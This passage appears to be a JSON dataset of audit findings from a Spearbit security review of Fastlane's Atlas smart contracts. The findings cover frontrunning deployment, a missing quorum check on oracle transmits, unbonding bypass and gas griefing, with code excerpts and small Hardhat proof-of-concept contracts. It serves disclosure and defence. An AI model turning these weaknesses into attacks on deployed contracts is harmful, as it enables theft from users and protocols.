zeroth index unset, which can later lead to duplicate attempts of the first solverOp. Here is a proof of concept to show the issue: // SPDX-License-Identifier: MIT OR Apache-2.0 pragma solidity 0.8.25; import \"hardhat/console.sol\"; contract test { constructor() { uint ol = 2; uint256[] memory _getBidAmount = new uint256[](ol); _getBidAmount[0] = 6; // works if one of these values is 0 _getBidAmount[1] = 6; uint256[] memory sortedOps = new uint256[](ol); uint256[] memory bidAmounts = new uint256[](ol); uint256 j; uint256 bidPlaceholder; for (uint256 i; i < ol; i++) { bidPlaceholder = _getBidAmount[i]; if (bidPlaceholder == 0) { unchecked { ++j;} continue; } else { bidAmounts[i] = bidPlaceholder; for (uint256 k = i - j + 1; k > 0; k--) { if (bidPlaceholder > bidAmounts[sortedOps[k - 1]]) { sortedOps[k] = sortedOps[k - 1]; sortedOps[k - 1] = i; 18 } else { sortedOps[k] = i; break; } } } } uint total = ol - j; console.log(\"total\",total); for (uint256 i; i < total; i++) { console.log(i,sortedOps[i],bidAmounts[sortedOps[i]]); } } }", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "userOp validation is skipped in simulation mode for smart contract user accounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "It can happen that user has not allowed this userOp (ie, returning validateUserOp() returns false), but during simulation it's falsely believed that the user has allowed it since isSimulation is true: bool validSmartWallet = IAccount(userOp.from).validateUserOp{ gas: 30_000 }(userOp, _getProofHash(userOp), 0) == 0; return (isSimulation || validSmartWallet); If this userOp goes onchain, it leads to a revert wasting gas for the bundler.", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "ExecutionEnvironment deployment can be incorrectly skipped", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "ExecutionEnvironment is deployed iff the address executionEnvironment, at which it's going to be deployed, has no code. The is checked by ensuring executionEnvironment.codehash is 0. However, someone can frontrun this transaction by sending some ETH to this address. Now codehash returns a non-zero hash and executionEnvironment is never deployed. An address which doesn't have code but has any non-zero ether balance returns keccak256(\"\") as its codehash. This is as per the following EIPs:  From https://eips.ethereum.org/EIPS/eip-161: An account is considered empty when it has no code and zero nonce and zero balance.  From https://eips.ethereum.org/EIPS/eip-1052: In case the account does not exist or is empty (as defined by EIP-161) 0 is pushed to the stack. In case the account does not have code the keccak256 hash of empty data (i.e. is pushed to the c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470) stack.", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "Wrong ERC20 token transferred", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "tokenUserBuys ERC20 token is transferred here when it's meant to be auctionBaseCurrency since the balance amount transferred is corresponding to auctionBaseCurrency: if (auctionBaseCurrencyBalance > 0) { ERC20(swapIntent.tokenUserBuys).safeTransfer(user, auctionBaseCurrencyBalance); }", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "Borrow()s after validateBalances()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function borrow() can still be called in the AllocateValue and PostOps phases. As this is after validateBalances() the solver has to pay for this in _settle(). However the solver is no longer in control and would be griefed this way. Another risk is highlighted in the issue \"Circumvent AtlETH unbonding period\".", "labels": ["Spearbit", "Fastlane", "Severity: High Risk"]}, {"title": "Simulation success may not guarantee on-chain success", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Before a bundler submits an Atlas transaction on-chain, they will simulate the transaction off-chain to ensure it succeeds. This will likely be done using the Simulator helper contract, or if the suggestion from the issue \"Simulation code path can be kept off-chain\" is taken, with some other off-chain method. Regardless of the approach taken, this is an important step of the Atlas process, since bundlers will waste ETH on gas costs if a transaction reverts. It's important to note that there are situations where off-chain simulation success does not guarantee on-chain success. This is a known concern in systems like ERC4337, which handles this problem with a specific simulation procedure described in ERC7562. For example, this specification disallows certain sections of code from using opcodes that can easily trick simulation (e.g. TIMESTAMP and COINBASE). In Atlas, there are a few locations where this may be a similar concern. This includes:  If userOp.from is a smart contract, the _verifyUser() function calls the contract to verify the user's signa- ture. If there aren't any restrictions on the contract's implementation, it may contain malicious logic designed to revert on-chain and waste the bundler's ETH.  If all solverOps fail, either the UserNotFulfilled() revert happens, or the bundler is treated as the winning solver, and in either case, the bundler is not reimbursed for all gas fees. Since solverOps can contain arbitrary logic, they may revert on-chain even after a successful off-chain simulation.  If any of the preOpsWrapper(), userWrapper(), or postOpsWrapper() functions revert, then the entire exe- cute() call reverts and the bundler will not be reimbursed any gas. This implies that a userOp or DAppControl could grief the bundler if it's designed to trick simulation.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "No quorum requirements for transmit() function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In order to transmit() a new oracle update to the ChainlinkAtlasWrapper, a transmitter provides the signatures of other whitelisted signers that are attesting to the oracle update. However, neither of the transmit() or verifyTransmitSigners() functions verify the amount of signatures sub- mitted, and providing an empty array of signatures will technically succeed. This behavior changes the trust assumptions of the ChainlinkDAppControl since a transmitter has full control of each oracle update.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "getBidValue() is not always used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Sorter uses getBidValue() to sort the bids. However Atlas / _bidFindingIteration() and escrow / _getBidAmount() don't do that and use solverOp.bidAmount directly. In the example code these values are the same because the following function is used. However in the general case they might be different. function getBidValue(SolverOperation calldata solverOp) public pure override returns (uint256) { return solverOp.bidAmount; }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Hashes don't depend on the DAppControl config state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The control address contributes to the hash calculation of the UserOperation, solverOp, and DAp- pOperation structs. This means that when a party provides a signature for verification, they specify exactly which DAppControl address they're interacting with. However, it should be noted that it's possible for a DAppControl to change its behavior while remaining at the same address. For example, a DAppControl can be programmed to return different a CallConfig value on separate calls. While this would change the underlying ExecutionEnvironment address used, the signatures for each UserOperation, solverOp, and DAppOperation would remain valid, which can add unexpected trust assumptions. For instance, a solverOp is not replayable as long as the corresponding solverOp.userOpHash only appears on-chain once. However, if a DAppControl flips its userNoncesSequenced boolean, the same userOp nonce can be used in two different contexts, which might allow the solverOp to be replayed.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Solvers can be unfairly forced into gas refunds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The EscrowBits library defines the circumstances when a solver is required to refund the bundler for gas costs. For example, the SolverOutcome.BidNotPaid flag is part of the _FULL_REFUND value, which means a solver needs to reimburse their gas usage if their solverOp fails due to an insufficient bid. Since these gas costs are forced on the solver, it's important that each error leading to reimbursement is actually something the solver is at fault for. This does not always seem to be the case currently, including the following:  The SolverOutcome.DeadlinePassed flag is part of the _PARTIAL_REFUND value, although the timestamp when a solverOp is included on-chain is something the bundler controls. So, solvers are unnecessarily punished if the bundler includes their solverOp late. 23  The SolverOutcome.GasPriceOverCap flag is part of the _PARTIAL_REFUND value, although the tx.gasprice is something in control of the bundler. So, if the bundler specifies an unreasonably large priority fee, the solver is ultimately punished for not accepting the price. This is also relevant to the SolverOutcome.GasPriceBelowUsers flag when allowsTrustedOpHash() == true, as the solver does not know the userOp.maxFeePerGas ahead of time.  The SolverOutcome.PreSolverFailed flag is part of the _PARTIAL_REFUND value, although the failure of the preSolverCall() may be due to the DAppControl and not the solver. The SolverOutcome.EVMError simi- larly punishes the solver but may be caused by an error during the abi.decode() on the preSolverCall() return value (note: this is suggested to be removed in the issue titled \"preSolverCall() can revert instead of returning false\"). These are contrary to the fact that the SolverOutcome.AlteredControl error can also be caused by unexpected preSolverCall() behavior, but is a part of the _NO_REFUND category.  The SolverOutcome.PerBlockLimit flag is part of the _PARTIAL_REFUND value, but solvers may not be able to prevent multiple of their solverOps executing in the same block. For example, if a solver interacts with a DAppControl with allowsTrustedOpHash() == true, they may not know exactly when their transactions will be executed on-chain, and may accidentally be included twice in a block.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "_bidFindingIteration doesn't reset key.callIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "_bidFindingIteration() sends key as a memory parameter to _getBidAmount(), which means it is sent by reference. _getBidAmount() increments key.callIndex via holdSolverLock(). Values of key that are updated in _bidFindingIteration() can be used in the following loop iteration. If that would not work, then key.callIndex would be the same every time. Also see: \"Passsing of key can be simplified\". After the last loop the value of key.callIndex == solverOps.length. Then the second loop with _execute- SolverOperation() starts, which continues to use key.callIndex. So key.callIndex could end up to be 2x solverOps.length, depending on the winning solver. However considering issue \"callIndex incremented twice\" in _executeSolverOperation() : key.callIndex could end up to be 3(cid:2) solverOps.length, depending on the winning solver. Because callIndex is of type uint8, only 256/3 == 83 solvers can be supported, which is a lot less than MAX_SOLVERS (253). 24 struct EscrowKey { // ... uint8 callIndex; // ... } function _bidFindingIteration(/*...*/ ) /*...*/ { // ... for (uint256 i; i < solverOps.length; i++) { bidPlaceholder = _getBidAmount(dConfig, userOp, solverOps[i], returnData, key); // ... } // key.callIndex == solverOps.length for (uint256 i; i < j; i++) { // ... (auctionWon, key) = _executeSolverOperation(..., key); // continues to use key // ... } } function _getBidAmount(..., EscrowKey memory key) /*...*/ { // ... data = abi.encodePacked(data, key.holdSolverLock(solverOp.solver).pack()); // increment callIndex // ... } function holdSolverLock(EscrowKey memory self, address nextSolver) internal pure returns (EscrowKey ,! memory) { // ... ++self.callIndex; // ... } Here is a proof of concept that shows the issue: 25 // SPDX-License-Identifier: MIT OR Apache-2.0 pragma solidity 0.8.25; import \"hardhat/console.sol\"; struct EscrowKey { uint8 callIndex; } library SafetyBits { function holdSolverLock(EscrowKey memory self) internal pure returns (EscrowKey memory) { ++self.callIndex; return self; } } contract test { using SafetyBits for EscrowKey; function _bidFindingIteration(EscrowKey memory key) public { uint ol = 10; for (uint256 i; i < ol; i++) { _getBidAmount(key); } console.log(\"key.callIndex=\",key.callIndex); // 10 } function _getBidAmount(EscrowKey memory key) internal { key.holdSolverLock(); } constructor() { EscrowKey memory key; _bidFindingIteration(key); } }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "atlasSolverCall() doesn't check caller", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function atlasSolverCall() doesn't check if its called from/via Altas. It does check sender, but this is a user supplied variable so has no guarantees. Without checks the code might potentially be abused. function atlasSolverCall( address sender, /*...*/ ) /*...*/ safetyFirst(sender) /*...*/ { // ... } modifier safetyFirst(address sender) { require(sender == _owner, \"INVALID CALLER\"); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Circumvent AtlETH unbonding period", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The function _assign() allows the usage of ETH that is bonded. This is what it is designed for. Here is an approach to abuse this:  Assume one party combines all roles: user, auctioneer, bundler, solver and DappControl.  The party borrows ETH after validateBalances(), see issue \"Borrow()s after validateBalances()\".  Assume the borrowed amount is less than the bonded balance of the party.  With _settle(), the borrowed amount subtracted from the bonded balance of the party.  The party still has the borrowed amount. So effectively ETH is freed while it was bonded, without have to wait for the AtlETH unbond period. function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { // ... EscrowAccountAccessData memory aData = accessData[owner]; if (aData.bonded < amt) { // ... } else { aData.bonded -= amt; } accessData[owner] = aData; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Check with withdrawals in _borrow() is incorrect", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The check with withdrawals in function _borrow() doesn't seem correct because balance is de- creased with safeTransferETH, when withdrawals is increased so it counts double. This example shows the issue:  Assume claims and the initial value of withdrawals are neglectible.  Assume atlas contains 100 ETH.  Try to borrow 75 ETH:  (address(this).balance < amount + claims + withdrawals) ) 100 ETH < 70 ETH + 0 + 0 ) ok to borrow.  After this. withdrawals == 75 ETH and balance == 25 ETH.  Now try to borrow an extra 10 ETH.  (address(this).balance < amount + claims + withdrawals) ) 25 ETH < 10 ETH + 0 + 75 ETH ) not ok to borrow. So you can't borrow the extra 10 ETH although atlas still has enough ETH. However if you directly borrow 85 ETH then there is no problem. Also see issue \"_releaseSolverLock() doesn't undo all the actions of _trySolverLock()\" for another issue with the check in _borrow(). function borrow(uint256 amount) external payable { // ... if (_borrow(amount)) { SafeTransferLib.safeTransferETH(msg.sender, amount); } else { revert InsufficientAtlETHBalance(address(this).balance, amount); } } function _borrow(uint256 amount) internal returns (bool valid) { if (amount == 0) return true; if (address(this).balance < amount + claims + withdrawals) return false; withdrawals += amount; return true; }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Checks for solverCalledBack don't cover all situations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function solverMetaTryCatch() checks reconcile() isn't called by the PreSolver and that it is called by the PostSolver. However these checks don't cover all situations:  If needsPreSolver() == false then the first check isn't done.  If needsSolverPostCall() == false then the second check isn't done. function solverMetaTryCatch(/*...*/ ) /*...*/ { // ... if (config.needsPreSolver()) { // call PreSolver // ... (, success,) = IEscrow(atlas).solverLockData(); if (success) revert AtlasErrors.InvalidEntry(); } // call atlasSolverCall if (config.needsSolverPostCall()) { // check reconcile() has been called // Verify that the solver contract hit the callback before handing over to PostSolver hook (, success,) = IEscrow(atlas).solverLockData(); // check reconcile() has been called if (!success) revert AtlasErrors.CallbackNotCalled(); // call postSolverCall } // ... } function reconcile(/*...*/ ) // ... // ... _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack; // ... } function solverLockData() public view returns (address currentSolver, bool calledBack, bool fulfilled) { uint256 solverLock = _solverLock; // ... calledBack = solverLock & _solverCalledBack != 0; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "ChainlinkAtlasWrapper may break protocol integrations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The ChainlinkAtlasWrapper is intended to be used by integrating protocols as a replacement for the original BASE_FEED Chainlink contract. There are currently two things that would make this integration difficult: 1. The latestRoundData() function does not maintain the behavior from the original Chainlink oracle. This function always returns the current roundId, startedAt, and answeredInRound from the BASE_FEED. This means that an oracle update in the ChainlinkAtlasWrapper will change the overall answer, but will not change the corresponding roundId. This implies that one roundId can have multiple answers, which is not possible in the original Chainlink contracts. 2. There are some functions missing in the ChainlinkAtlasWrapper. For example, the decimals() and getRoundData() functions are commonly used by protocols, but do not exist in the ChainlinkAtlasWrapper.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "callIndex incremented twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _executeSolverOperation() increases callIndex. The function is also called from a loop in either _bidFindingIteration() or _bidKnownIteration(). So callIndex is incremented twice for every failed SolverOp, which doesn't seems logical. Also see issue \"_bidFindingIteration doesn't reset key.callIndex\" how this is a factor in limiting the maximum solvers to 83. function _bidFindingIteration(/*...*/ ) /*...*/ { // ... for (uint256 i; i < j; i++) { (auctionWon, key) = _executeSolverOperation(/*...*/ ); if (auctionWon) { // ... return (auctionWon, key); } } } function _executeSolverOperation(/*...*/ ) /*...*/ { // ... key = key.holdSolverLock(solverOp.solver); // increments callIndex // ... if (result.executionSuccessful()) { key.solverSuccessful = true; return (true, key); // auctionWon = true } // ... ++key.callIndex; // why is this done? Is within a loop // ... } function holdSolverLock(EscrowKey memory self, address nextSolver) internal pure returns (EscrowKey ,! memory) { // ... ++self.callIndex; // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Winning solver doesn't get gas costs _assign()ed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _executeSolverOperation() doesn't call _releaseSolverLock() for the winning solver so the gas costs don't get _assign()ed. function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.executionSuccessful()) { // ... key.solverSuccessful = true; // auctionWon = true return (true, key); // no call to _releaseSolverLock } // ... _releaseSolverLock(solverOp, gasWaterMark, result, false, !prevalidated); // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "claims accounting only tracks execution costs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The claims storage variable records the ETH that will be reimbursed to the bundler for paying transaction fees. Currently, this value only tracks the difference between two calls to gasleft(), which implies that the bundler is only reimbursed for execution costs between two markers. However, there are other costs associated with being a bundler, for example, a base 21_000 gas cost for the entire transaction and an additional cost for each byte of calldata. To be more accurate, these costs could be added to the claims accounting. It appears that this was already intended based on the following commented-out code: uint256 gasMarker = gasleft(); // + 21_000 + (msg.data.length * _CALLDATA_LENGTH_PREMIUM); and also based on the fact that _releaseSolverLock() may charge some solvers for their calldata costs.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Incorrect SURCHARGE multiplication", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In the _setAtlasLock() function, the following code sets claims to the maximum amount of ETH the bundler will use, including a surcharge: // Set the claimed amount uint256 rawClaims = (gasMarker + 1) * tx.gasprice; claims = rawClaims + ((rawClaims * SURCHARGE) / 10_000_000); Later on in the _settle() function, the remaining unused gas is subtracted from claims, also including the sur- charge: uint256 gasRemainder = (gasleft() * tx.gasprice); gasRemainder += ((gasRemainder * SURCHARGE) / 10_000_000); _claims -= gasRemainder; Since both of these terms included the surcharge, the _claims value in _settle() ultimately represents the total ETH used by the bundler plus the surcharge amount. Therefore the following calculation is based on a combined amount, which is incorrect: uint256 netGasSurcharge = (_claims * SURCHARGE) / 10_000_000; _claims -= netGasSurcharge; surcharge = _surcharge + netGasSurcharge; SafeTransferLib.safeTransferETH(bundler, _claims); For example, with a 10% surcharge, this code sets netGasSurcharge to 10% of 110% of the total ETH used, which leads to the bundler only being reimbursed 99% of the ETH they spent.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Call to validateUserOp() won't work", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "_verifyUser() uses the ERC4337 function validateUserOp() to validate smart contract wallets. There are several reasons why this won't work:  entryPoint v0.6 has a different layout for UserOperation.  entryPoint v0.7 has yet another layout for UserOperation.  smartwallets usually allow only calls from the EntryPoint to validateUserOp, see BaseAccount.sol.  Any random smart contract that has a fallback function that returns 0 on unknown functions would satisfy this check. Note: other erc-4337 wallets usually don't put a gas limit when calling validateUserOp(). function _verifyUser(/*...*/ ) /*...*/ { if (userOp.from.code.length > 0) { // ... bool validSmartWallet = IAccount(userOp.from).validateUserOp{ gas: 30_000 }(userOp, _getProofHash(userOp), 0) == 0; return (isSimulation || validSmartWallet); } // ... }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "V2DAppControl allows both amount0Out and amount1Out to be non-zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "V2DAppControl assumes exactly one amount0Out and amount1Out is non-zero, but this isn't en- forced. If both these values are non-zero, amount0In and amount1In are calculated incorrectly: uint256 amount0In = amount1Out == 0 ? 0 : SwapMath.getAmountIn(amount1Out, uint256(token0Balance), uint256(token1Balance)); ,! uint256 amount1In = amount0Out == 0 ? 0 : SwapMath.getAmountIn(amount0Out, uint256(token1Balance), uint256(token0Balance)); ,! This calculation assumes that after the swap, the pool will only transfer out exactly one token.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "ChainlinkAtlasWrapper allows retransmitting old reports", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "When transmit() is called on the ChainlinkAtlasWrapper, there is nothing checking that the report and corresponding signatures haven't been used before. While the transmitters are whitelisted and trusted to an extent, this behavior means a single bad actor can exploit the system (which is otherwise secured by multiple independent parties).", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Solvers don't always reimburse the bundler", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In the Atlas system, bundlers pay gas fees upfront and are eventually reimbursed throughout the transaction flow. This is facilitated through the claims storage variable (which tracks the total amount due), the _releaseSolverLock() function (which assigns a reimbursement amount to a specific solver), and finally the _- settle() function (which ensures that deposits >= withdrawals + claims). While this system generally assigns costs fairly, there are two situations where reimbursements are not made as expected. Both situations are the result of an early return that skips a call to _releaseSolverLock(), even though the early return may be caused by a _PARTIAL_REFUND error (which is expected to result in a gas reimbursement). The first location of this issue is in the _getBidAmount() function, where _releaseSolverLock() is only reached if all validation succeeds and the solverMetaTryCatch() call is made. Also, note that since there are situations where gas is charged, there seems to be a contradiction with the following comment in the function: // NOTE: To prevent a malicious bundler from aggressively collecting storage refunds, // solvers should not be on the hook for any on chain bid finding gas usage.   The second location of this issue is in the _executeSolverOperation() function, where an early return can happen if the _handleAltOpHash() logic fails.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Deadline check skipped in simulation mode", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Deadline check for userOp and dAppOp is skipped in simulation mode. This shouldn't be the case as a successful simulation will lead to an onchain transaction which will then revert wasting gas for the bundler.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "amount is downcasted to uint112 without overflow protection", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "amount is downcasted from uint256 to uint112 at various places in AtlEth.sol as highlighted above. transfer() and transferFrom() could do an emit with a very large amount if passing an amount such as type(uint112).max + 1. This will confuse chain indexers. function _deduct(address account, uint256 amount) internal { uint112 amt = uint112(amount); // ... revert InsufficientBalanceForDeduction(/*...*/ , amount); // possibly large amount } function _burn(address from, uint256 amount) internal { _deduct(from, amount); totalSupply -= amount; // ... // will fail with large amount } function transfer(address to, uint256 amount) public returns (bool) { _deduct(msg.sender, amount); _balanceOf[to].balance += uint112(amount); emit Transfer(msg.sender, to, amount); // could do emit with large amount // ... } function transferFrom(address from, address to, uint256 amount) public returns (bool) { uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals. if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; // could fail _deduct(from, amount); _balanceOf[to].balance += uint112(amount); emit Transfer(from, to, amount); // could do emit with large amount return true; } In _unbond() an artificial amount is emitted when passing an amount such as type(uint112).max + 1. 36 function unbond(uint256 amount) external { _unbond(msg.sender, amount); } function _unbond(address owner, uint256 amount) internal { uint112 amt = uint112(amount); // can be truncated // ... emit Unbond(owner, amount, block.number + ESCROW_DURATION + 1); } Function _mint() also does the downcast. But this won't happen in practice because it is only called via deposit() and depositAndBond() which are bounded by msg.value. function _mint(address to, uint256 amount) internal { totalSupply += amount; _balanceOf[to].balance += uint112(amount); emit Transfer(address(0), to, amount); }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Solver bundler doesn't enforce exactly one solverOps", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _verifyAuctioneer() use solverOps[0]. This will revert when there are no solverOps. Note: this can happen when allowsZeroSolvers()==true. As we understood from the Fastlane project, when a solver is also a bundler there should be exactly one solverOps. This isn't enforced in the code. function _verifyAuctioneer(/*...*/ ) /*...*/ { // ... if (dConfig.callConfig.allowsSolverAuctioneer() && dAppOp.from == solverOps[0].from) return (true, true); // ... ,! }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "External calls may use more gas than gasLimit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "In the following case, .call copies the entire return data to memory even if it isn't used: (success,) = solverOp.solver.call{ gas: gasLimit, value: solverOp.value }(solverCallData); Since this leads to memory expansion costs, this call may use significantly more gas than just the gasLimit value. The solverGasLimit is used in _validateSolverOperation() to ensure a solver has sufficient funds, so it's likely unexpected for this call to use extra gas. Although data isn't supposed to be returned in this call, it may be done intentionally by an adversarial solver to grief the system.", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "reconcile() can be called by anyone", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Anyone can call reconcile() because the the checks on lock and currentSolver are done with user supplied parameters. These checks can even pass when lock == UNLOCKED or _solverLock == _- UNLOCKED_UINT. Function reconcile() can set the flags _solverCalledBack and _solverFulfilled. Luckily _trySolverLock() resets these flags. Although _trySolverLock() isn't always done, as show in the issue \"_releaseSolverLock() can be run without _trySolverLock()\". Currently that doesn't create an issue. Function reconcile() can do several unwanted actions:  reconcile() creates deposits out of thin air  Flag _solverFulfilled is unreliable After validateBalances then _solverFulfilled is not used anymore. After _settle() then deposits is not used anymore. Places where reconcile() can be called:  Before the call to metacall() ! not an issue.  In PreOps hook ! before validateBalances and _settle() so is an issue.  In UserOp hook ! before validateBalances and _settle() so is an issue.  In Solver / PreSolver ! not an issue because then it is supposed to happen.  In AllocateValue ! before _settle() so is an issue.  In PostOps ! before _settle() so is an issue.  Via safeTransferETH() of _settle() ! after the relevant logic of _settle() so is no issue.  Via safeTransferETH() of metacall() ! deposits not used ! no issue. 38 function reconcile(address environment, address solverFrom,...) ... { ,! // ... if (lock != environment) revert InvalidExecutionEnvironment(lock); // environment is user supplied (address currentSolver, bool calledBack, bool fulfilled) = solverLockData(); if (solverFrom != currentSolver) revert InvalidSolverFrom(currentSolver); // solverFrom is user supplied // ... _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack; // ... _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack | _solverFulfilled; } function _trySolverLock(SolverOperation calldata solverOp) internal returns (bool valid) { if (_borrow(solverOp.value)) { _solverLock = uint256(uint160(solverOp.from)); // resets flags  ,! _solverFulfilled   _solverCalledBack  and // ... } else { // ... } }", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "A solver with insufficient funds can block further processing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "Function _settle() reverts if the Solver can't pay for the costs. When function _settle() reverts then metacall() also reverts. The costs could be: gas usage or any Borrow()s after validateBalances(). This way a solver with insufficient funds can block further processing of the other solvers. However a user would expect that when a solver fails, then next solver in the list would be used. In comparison: When a solver doesn't win, and via _releaseSolverLock(), the gas _assign()ment fails, then that error is ignored. Note: Borrow()s after validateBalances() are questionable, see issue \"Borrow()s after validateBalances()\". function _settle(/*...*/ ) /*...*/ { // ... if (_assign(winningSolver, amountOwed, true, false)) { revert InsufficientTotalBalance((_claims + _withdrawals) - deposits); } // ... } function _releaseSolverLock(/*...*/ ) /*...*/ { // ... _assign(solverOp.from, gasUsed, false, bidFind); // failure to assign is ignored } 39", "labels": ["Spearbit", "Fastlane", "Severity: Medium Risk"]}, {"title": "Remove Test inheritance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "SolverBase inherits from Test contract: contract SolverBase is Test { This increases the contract size and may expose any unsafe functionality.", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "disableDApp() doesn't clean up dAppSignatories[]", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "disableDApp() doesn't clean up dAppSignatories[] like _removeSignatory() does. This could be a problem if the dapp would be enabled again, then dAppSignatories[] would contain the same govAddress address twice. Also getDAppSignatories() doesn't give an accurate view. Function disableDApp() doesn't check the signatoryKey was enabled, like changeDAppGovernance() does. This could result in redundant emits. 40 function disableDApp(address dAppControl) external { // ... signatories[signatoryKey] = false; //... // no clean up of dAppSignatories[] } function _removeSignatory(address controller, address signatory) internal { // ... delete signatories[signatoryKey]; for (uint256 i = 0; i < dAppSignatories[controller].length; i++) { if (dAppSignatories[controller][i] == signatory) { dAppSignatories[controller][i] = ,! dAppSignatories[controller][dAppSignatories[controller].length - 1]; dAppSignatories[controller].pop(); break; } } }", "labels": ["Spearbit", "Fastlane", "Severity: Low Risk"]}, {"title": "Use of storage variables versus delegatecall", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf", "body": "The usage of storage with DAppControl is not 